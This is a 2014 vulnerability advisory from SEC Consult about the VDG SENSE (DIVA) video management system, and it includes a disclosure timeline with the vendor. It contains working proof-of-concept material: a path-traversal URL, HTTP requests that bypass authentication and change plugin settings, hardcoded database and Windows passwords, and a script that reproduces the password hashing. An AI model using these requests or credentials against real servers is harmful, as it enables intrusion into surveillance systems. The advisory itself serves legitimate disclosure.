SEC Consult Vulnerability Lab Security Advisory < 20141218-0 >
=======================================================================
              title: Multiple critical vulnerabilities
            product: VDG Security SENSE (formerly DIVA)
 vulnerable version: 2.3.13
      fixed version: unknown - no vendor confirmation
             impact: critical
           homepage: <https://vdgsecurity.com/>
              found: 2014-10-01

=======================================================================

Vendor description:
-------------------
"VDG Sense is our video management system (VMS). VDG Sense gives you control
of all live images and stored video data, in a user-friendly interface. Our
solution is based on an open platform, tailored to your specific needs and
requirements and ready to be integrated in any security solution."
Source: <https://vdgsecurity.com/sense/>

"DIVA is our former trademark, which we used to brand our video management
software and other VDG products. With the launch of our new trademark, VDG
Sense, we have rebranded the software to VDG Sense and promote it as such
from September 15, 2014. Other products, such as our servers, are available
under the label VDG."
Source: <https://vdgsecurity.com/diva/>

Business recommendation:
------------------------
Attackers are able to completely compromise the VDG SENSE server as they can
gain access at the system level. SENSE server can be used as an entry point
into the target infrastructure (lateral movement, privilege escalation).

It is highly recommended by SEC Consult not to use this software until a
thorough security review has been performed by security professionals and all
identified issues have been resolved.

Although the vendor does not respond to our mails any more, some
vulnerabilities seem to be fixed in the most recent version of SENSE (2.3.15).
It is assumed that further critical vulnerabilities exist.

Vulnerability overview/description:
-----------------------------------
1) Unauthenticated local file disclosure
Unauthenticated users can read arbitrary files from the filesystem with the
privileges of the "SYSTEM" operating system user. These files include
configuration files containing sensitive information such as clear text
passwords/password hashes which can be used in further attacks.

2) Authentication bypass / Clear text password disclosure
Some parts of the DIVA application are vulnerable to authentication bypass. This
allows attackers to update DIVA plugin configuration. Furthermore DIVA plugin
configurations can be read. This configuration includes clear text DIVA
administrator credentials as DIVA plugins requires access to such an account
for operation.

3) Insecure service configuration / Hardcoded default credentials - Postgres
The PostgreSQL database is offered via the network (TCP port 5432) and can be
accessed remotely using hardcoded credentials which can't be changed.

4) Hardcoded default credentials - Windows Users
Several local Windows users are created in the course of the DIVA setup. These
are used to run some of the DIVA services. These users can be used to log on to the
server running DIVA.

5) Critical information disclosure / User database leakage
After authentication with the DIVA (fat) client via the proprietary protocol
(TCP port 51410) the server returns the contents of the user database
to the client. This works regardless of whether the user has administrator
rights or not.
The user database (users.ini) contains all users and their password hashes.
This information is sufficient to log in as another user. An attacker does not
require knowledge about plain text passwords.

6) Use of plain text protocols
All DIVA communication transport channels (eg. vie TCP port 80, 51410) lack
encryption.

7) Buffer overflow vulnerabilities
The DIVA web service API (/webservice) is vulnerable to a stack based buffer
overflow when processing "AuthenticateUser" requests. Both the "user" and the
"password" parameter are vulnerable.
None of the DIVA modules are ASLR-enabled. An exploit that uses ROP to bypass
DEP has been implemented.

Proof of concept:
-----------------
1) Unauthenticated local file disclosure
Arbitrary files can be downloaded because of vulnerabilities in the proprietary
web server implementation. An example for the x64 hosts:
http://<host>/images/../../../../Windows/SysWOW64/config/systemprofile/AppData/Roaming/Diva/Settings/users.ini

Interesting DIVA-specific files:
config/systemprofile/AppData/Roaming/Diva/Settings/users.ini (DIVA user database)
config/systemprofile/AppData/Roaming/Diva/DivaManager/DivaManager.ini (contains DIVA
"master user")
config/systemprofile/AppData/Roaming/Diva/DivaManager/Plugins/ (DIVA plugin
configurations)
[...]

2) Authentication bypass / Clear text password disclosure
Authentication for parts of the application can be bypassed by sending the HTTP
Authorization header containing a colon ":".

GET /plugins/divacal/getsettings?sessionkey= HTTP/1.1
Host: <host>
Authorization: Basic Og==

The response contains the plugin configuration for "divacal":

HTTP/1.1 200 OK
Date: Thu, 23 Okt 2014 10:46:28 GMT
Server: Diva HTTP Plugin 2.0
Accept-Ranges: bytes

        <help>The password required to login to the DIVA management server.</help>
      </setting>
    </subgroup>
  </group>
</settings>

Other activated plugins can be queried via the following request:
GET /plugins/?sessionkey= HTTP/1.1
Host: <host>
Authorization: Basic Og==

Plugin settings can be updated as follows:
POST /plugins/http/updatesettings?sessionkey= HTTP/1.1
Host: <host>
Authorization: Basic Og==
Content-Length: 29

groupid=0&DocumentRoot=htdocs

3) Insecure service configuration / Hardcoded default credentials - Postgres
The Postgres root user is as follows:

Username: root
Password: ArpaRomaWi

4) Hardcoded default credentials - Windows Users
The created Windows users are as follows:

Username: postgres
Password: !DVService

Username: NTP
Password: !DVService

5) Critical information disclosure / User database leakage

For the sake of completeness the password hashing scheme has been reverse
engineered. As both hashes can be used for authentication directly, brute
force attacks against password hashes are not required.

#!/usr/bin/env python
import hashlib
from base64 import b64encode

user='administrator'
password='!DVadmin'

digestHash = hashlib.md5(user+":DIVA:"+password).digest().encode('hex').upper()
passwordHash = b64encode(hashlib.sha1(hashlib.sha1(password).digest()).digest())

print 'digestHash',digestHash
print 'passwordHash',passwordHash

6) Use of plain text protocols
No proof of concept necessary.

7) Buffer overflow vulnerabilities
Detailed proof of concept exploits have been removed for this vulnerability.

Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been verified to exist in 2.3.13, which was the most
recent version at the time of discovery.

Vendor contact timeline:
------------------------
2014-10-24: Sending responsible disclosure policy and requesting encryption
            keys.
2014-10-28: Vendor responds, provides encryption keys.
2014-10-29: Sending advisory and proof of concept exploit via encrypted
            channel.
2014-10-29: Vendor confirms receipt of advisory.
2014-11-10: Requesting status update.
2014-11-17: Vendor states that team is "very well on track to solve the
            issues".
2014-11-18: Clarifying criticality of vulnerabilities and viability of attack,
            even in closed networks; referring to Shodan search results.
2014-12-10: Requesting status update. No reply.
2014-12-18: SEC Consult releases security advisory.

Solution:
---------
It seems some of the vulnerabilities are fixed in the most recent version of
SENSE (2.3.15). The vendor stopped responding to our emails so we don't know
what vulnerabilities were actually fixed.

Workaround:
-----------
No workaround available.

# Vulnerability Lab

With the¬†**Vulnerability Lab**, SEC Consult¬†**operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process.
